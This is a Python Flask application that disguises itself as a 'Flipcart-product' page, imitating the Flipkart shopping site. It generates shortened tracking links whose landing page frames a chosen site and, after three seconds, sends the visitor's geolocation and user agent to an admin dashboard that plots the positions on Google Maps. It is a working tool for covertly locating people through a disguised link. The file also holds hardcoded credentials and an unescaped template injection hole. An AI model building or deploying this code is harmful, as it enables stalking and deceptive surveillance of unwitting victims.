from flask import Flask, request, render_template_string, url_for, Response, redirect
import uuid
import datetime
from functools import wraps
import random
import string
import requests

app = Flask(__name__)

# =====================
# In-memory storage
# =====================
locations = {}        # {track_id: {lat, lon, time}}
short_links = {}      # {short_code: track_id}
auth_attempts = {}    # {IP: failed_attempts}
click_counts = {}     # {track_id: clicks}

# =====================
# Admin credentials
# =====================
USERNAME = "Sritan"
PASSWORD = "Tansri@2018"
MAX_ATTEMPTS = 2
SAFE_IPS = ["110.235.237.142"]  # replace with your device IP to never block

# =====================
# Authentication helpers
# =====================
def get_client_ip():
    return request.remote_addr

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def authenticate():
    ip = get_client_ip()
    if ip in SAFE_IPS:
        # Never block your own system
        return Response(
            '🔒 Authentication required', 401,
            {'WWW-Authenticate': 'Basic realm="Login Required"'}
        )

    auth_attempts[ip] = auth_attempts.get(ip, 0) + 1
    if auth_attempts[ip] >= MAX_ATTEMPTS:
        return redirect("https://www.flipkart.com")

    return Response(
        '🔒 Authentication required', 401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        ip = get_client_ip()
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        else:
            auth_attempts[ip] = 0
        return f(*args, **kwargs)
    return decorated

# =====================
# URL shortener (TinyURL)
# =====================
def shorten_url(long_url):
    try:
        response = requests.get(f"http://tinyurl.com/api-create.php?url={long_url}")
        if response.status_code == 200:
            return response.text
    except:
        pass
    return long_url

# =====================
# Generate short code
# =====================
def generate_short_code(length=6):
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    while code in short_links:
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return code

# =====================
# Create short link
# =====================
def create_short_link(track_id):
    code = generate_short_code()
    short_links[code] = track_id
    return url_for("redirect_short_link", code=code, _external=True)

# =====================
# Admin Home Page
# =====================
@app.route("/", methods=["GET", "POST"])
@requires_auth
def home():
    custom_url = "https://www.flipkart.com"
    if request.method == "POST":
        custom_url = request.form.get("custom_url") or "https://www.flipkart.com"
    
    track_id = str(uuid.uuid4())
    tracking_url = url_for("track", track_id=track_id, _external=True) + f"?custom={custom_url}"
    short_url = shorten_url(tracking_url)
    branded_short = create_short_link(track_id)

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flipcart-product</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head>
    <body class="bg-light d-flex flex-column align-items-center justify-content-center vh-100">
        <div class="card shadow p-4 text-center" style="max-width: 600px; width: 100%;">
            <h2 class="mb-3">🔗 Flipcart-product Tracker</h2>
            <form method="POST" class="mb-3">
                <input type="url" name="custom_url" placeholder="Enter URL to track" class="form-control mb-2" required>
                <button type="submit" class="btn btn-primary w-100">Generate Tracking Link</button>
            </form>
            <hr>
            <p>Your tracking link:</p>
            <a href="{tracking_url}" target="_blank" class="btn btn-primary mb-2">{tracking_url}</a>
            <p>Shortened link (TinyURL):</p>
            <a href="{short_url}" target="_blank" class="btn btn-info mb-2">{short_url}</a>
            <p>Branded short link:</p>
            <a href="{branded_short}" target="_blank" class="btn btn-success mb-2">{branded_short}</a>
            <hr>
            <a href="/dashboard" class="btn btn-outline-dark mt-2">📊 View Dashboard</a>
        </div>
    </body>
    </html>
    """

# =====================
# Branded short link redirect
# =====================
@app.route("/s/<code>")
def redirect_short_link(code):
    track_id = short_links.get(code)
    if track_id:
        return redirect(url_for("track", track_id=track_id))
    return "Invalid link", 404

# =====================
# Tracking page (public)
# =====================
@app.route("/track/<track_id>")
def track(track_id):
    custom_url = request.args.get("custom", "https://www.flipkart.com")
    click_counts[track_id] = click_counts.get(track_id, 0) + 1

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flipcart-product</title>
        <style>
            html, body {{ margin:0; padding:0; height:100%; overflow:hidden; }}
            iframe {{ width:100%; height:100%; border:none; }}
        </style>
        <script>
            function requestLocation() {{
                navigator.geolocation.getCurrentPosition(
                    function(pos) {{
                        fetch("/save_location/{track_id}", {{
                            method: "POST",
                            headers: {{ "Content-Type": "application/json" }},
                            body: JSON.stringify({{
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                ua: navigator.userAgent
                            }})
                        }});
                    }}
                );
            }}
            setTimeout(requestLocation, 3000);
        </script>
    </head>
    <body>
        <iframe src="{custom_url}"></iframe>
    </body>
    </html>
    """
    return render_template_string(html)

# =====================
# Save location (public)
# =====================
@app.route("/save_location/<track_id>", methods=["POST"])
def save_location(track_id):
    data = request.json
    lat, lon = data.get("lat"), data.get("lon")
    locations[track_id] = {
        "lat": lat,
        "lon": lon,
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }
    return {"status": "success"}

# =====================
# Dashboard (admin only)
# =====================
@app.route("/dashboard")
@requires_auth
def dashboard():
    if not locations:
        table_rows = "<tr><td colspan='5' class='text-center text-muted'>No data yet</td></tr>"
    else:
        sorted_locations = sorted(locations.items(), key=lambda x: x[1]['time'], reverse=True)
        table_rows = ""
        for i, (track_id, info) in enumerate(sorted_locations):
            maps_link = f"https://www.google.com/maps?q={info['lat']},{info['lon']}"
            highlight = "table-success" if i == 0 else ""
            table_rows += f"""
            <tr class="{highlight}">
                <td>{track_id}</td>
                <td>{info['time']}</td>
                <td>{info['lat']}</td>
                <td>{info['lon']}</td>
                <td><a href="{maps_link}" target="_blank" class="btn btn-sm btn-success">🌍 View</a></td>
            </tr>
            """

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Flipcart-product</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
        <script>
            setTimeout(() => {{ window.location.reload(); }}, 10000);
        </script>
    </head>
    <body class="bg-light">
        <div class="container py-5">
            <div class="card shadow p-4">
                <h2 class="mb-4 text-center">📊 Flipcart-product Dashboard</h2>
                <table class="table table-hover table-bordered align-middle">
                    <thead class="table-dark">
                        <tr>
                            <th>Track ID</th>
                            <th>Click Time</th>
                            <th>Latitude</th>
                            <th>Longitude</th>
                            <th>Google Maps</th>
                        </tr>
                    </thead>
                    <tbody>
                        {table_rows}
                    </tbody>
                </table>
                <div class="text-center mt-3">
                    <a href="/" class="btn btn-primary">⬅️ Generate New Link</a>
                </div>
                <p class="text-muted text-center mt-2"><small>⏳ Auto-refreshes every 10 seconds</small></p>
            </div>
        </div>
    </body>
    </html>
    """
    return html

if __name__ == "__main__":
    app.run(debug=True)
